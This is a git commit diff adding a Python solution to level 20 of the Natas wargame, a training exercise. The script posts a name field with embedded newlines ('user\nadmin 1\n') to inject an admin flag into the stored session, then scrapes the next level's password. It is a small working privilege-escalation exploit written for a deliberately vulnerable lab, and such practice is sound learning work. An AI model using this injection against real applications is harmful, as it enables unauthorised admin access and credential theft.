56c82e086170f2485500979ae7e2a4b31f52c244
Evan Johnson <evanj2357@gmail.com>
2021-09-16 17:31:41 -0700

    level solved!

--- solutions/natas20.py
+++ solutions/natas20.py
@@ -1,4 +1,5 @@
 """
+serialized data injection
 """
 
 import requests
@@ -9,6 +10,23 @@ from natas_utils import *
 LEVEL = 20
 
 def solve(url: str, login: LevelLogin) -> Optional[str]:
+    with requests.session() as session:
+        session.auth = login
+        response = session.get(url)
+        response.raise_for_status()
+
+        # inject admin key:value via name change function
+        response = session.post(f"{url}/index.php", data={"name": "user\nadmin 1\n"})
+        response.raise_for_status()
+
+        # get the main page again to receive creds because session is now admin
+        response = session.get(url)
+        response.raise_for_status()
+
+    candidate_passwords = extract_candidate_passwords(response.text)
+
+    return try_level_login(LEVEL + 1, candidate_passwords)
+
     return None
 
 if __name__ == "__main__":
